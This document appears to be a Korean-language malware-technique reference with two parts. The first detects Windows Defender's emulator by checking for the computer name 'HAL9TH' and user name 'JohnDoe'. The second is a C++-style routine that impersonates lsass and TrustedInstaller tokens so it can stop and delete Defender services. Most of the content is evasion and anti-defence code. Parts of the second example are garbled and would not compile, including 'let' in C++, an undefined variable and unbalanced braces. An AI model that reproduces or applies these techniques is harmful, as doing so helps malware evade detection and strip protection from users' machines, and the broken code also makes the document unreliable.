## WinDef ComputerName & UserName

### Concept

- Windows Defender
	- `HAL9TH`라는 computer name을 사용.
	- `JohnDoe`라는 user name을 사용.
- 실행 흐름
	1. GetComputerNameA을 호출하여 computer name을 획득.
	2. GetUserNameA을 호출하여 user name을 획득.
	3. 획득한 computer name이 HAL9TH인지 확인.
	4. 획득한 user name이 JohnDoe인지 확인.

### GetComputerNameA

```C++
BOOL GetComputerNameA(
  [out]     LPSTR   lpBuffer,
  [in, out] LPDWORD nSize
);
```

### GetUserNameA

```C++
BOOL GetUserNameA(
  [out]     LPSTR   lpBuffer,
  [in, out] LPDWORD pcbBuffer
);
```

### Example

```C++
char computer_name[100];
char user_name[100];

GetComputerNameA(computer_name, 100);
GetUserNameA(user_name, 100);

if (strcmp(computer_name, "HAL9TH") == 0 && strcmp(user_name, "JohnDoe") == 0) {
	// Windows Defender Detected
}
```

## WinDef Services

### Concept

악성 코드는 악성 행위를 실행하기 전에 Windows Defender 관련 서비스들을 종료한다.

| Service               | Description                                                                            |
| --------------------- | -------------------------------------------------------------------------------------- |
| WdBoot                | 일반적인 컴퓨터의 오류, 파일의 손실로부터 보호 수정, 악성 코드, 하드웨어 오류 및 최대 성능을 위해 PC를 최적화합니다                   |
| WdFilter              | Windows Defender의 일부로, 파일을 열 때 맬웨어가 있는지 확인하고 백그라운드에서 PC를 검사합니다                         |
| WdNisDrv              | Windows Defender의 네트워크 검사 서비스로, 네트워크 프로토콜의 알려진 취약점과 새로 발견 된 취약점을 대상으로하는 침입 시도로부터 보호합니다 |
| wdnissvc              | Windows Defender의 네트워크 검사 서비스로, 네트워크 프로토콜의 알려진 취약점과 새로 발견 된 취약점을 대상으로하는 침입 시도로부터 보호합니다 |
| WinDefend             | Windows Defender의 핵심 서비스로, 파일을 열 때 맬웨어가 있는지 확인하고 백그라운드에서 PC를 검사합니다                     |
| wscsvc                | Windows 보안 센터 서비스로, Windows Update를 다운로드하고 설치하도록 설정합니다                                 |
| sppsvc                | Windows 및 해당 응용 프로그램에 대한 디지털 라이선스의 다운로드, 설치 및 적용을 가능하게하는 Microsoft 프로그램입니다             |
| Sense                 | 실시간으로 컴퓨터를 모니터링하며, 알 수 없는 파일이나 앱을 검사해서 장치를 보호해 주는 역할을 합니다                              |
| SecurityHealthService | Windows Defender 보안 센터의 일부로, 보안 상태를 지속적으로 모니터링하고 필요한 보안 조치를 취합니다                       |
### Code Flow

1. RtlAdjustPrivilege를 사용하여 SeDebugPrivilege 특권 활성
2. lsass.exe 토큰 복제하여 현재 스레드에 세팅
3. TrustedInstaller 토큰 복제하여 현재 스레드에 세팅
4. 서비스들을 순회하면서 Windows Defender 관련 서비스 검색
5. 서비스를 중지시키고 제거

### Example

```c++
// 사전 작업
RtlAdjustPrivilege(SeDebugPrivilege, True, False, &old);

lsass_pid = GetPid("lsass.exe");
h_lsass_token = DuplicateProcessToken(lsass_pid, SecurityImpersonation, TokenImpersonation);
NtSetInformationThread(0xfffffffe, ThreadImpersonationToken, &h_lsass_token, 0x4);
ZwClos(h_lsass_token);

trusted_installer_pid = StartTrustedInstaller();
h_trusted_installer_token = DuplicateProcessToken(trusted_installer_pid, SecurityImpersonation,
												  TokenImpersonation);
NtSetInformationThread(0xfffffffe, ThreadImpersonationToken, &h_trusted_installer_token, 0x4);
ZwClos(h_trusted_installer_token);

// WinDef 관련 서비스 삭제
scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
  
bytes_needed = 0;  
services_returned = 0;  
EnumServicesStatusExW(scm, 0, SERVICE_WIN32|SERVICE_DRIVER,
					  SERVICE_STATE_ALL, NULL, 0, &bytes_needed,
					  &services_returned, NULL, NULL);
  
essp = (LPENUM_SERVICE_STATUS_PROCESSW)malloc(bytes_needed);
EnumServicesStatusExW(scm, 0, SERVICE_WIN32|SERVICE_DRIVER,
					  SERVICE_STATE_ALL, essp, bytes_needed, &bytes_needed,
					  &services_returned, NULL, NULL);
CloseServiceHandle(scm);

i = 0;  
while (i < services_returned) {  
    service_name = essp[i].lpServiceName;  
    let hash = CalHash(&service_name);
    if (hash == target_hash) {
	    sc = OpenServiceW(scm,service_name, 0x10020);
            if (local_10 != 0x0) {
	            memset(ss, 0x0, 0x1c);
	            ControlService(sc, SERVICE_CONTROL_STOP, ss);
	            DeleteService(sc);
	            CloseServiceHandle(sc);
    }
    i += 1;  
}

```
